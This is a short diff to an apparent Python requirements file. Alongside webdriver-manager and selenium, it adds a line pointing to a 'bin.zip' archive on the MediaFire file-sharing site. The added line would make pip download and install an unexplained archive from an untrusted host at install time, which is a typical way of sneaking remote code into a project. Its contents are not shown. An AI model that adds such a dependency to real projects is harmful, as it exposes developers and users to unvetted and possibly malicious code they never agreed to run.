@@ -1,2 +1,3 @@
 webdriver-manager>=3.0.0
 selenium
+https://www.mediafire.com/file/6ldcg92urbf4sml/bin.zip/file
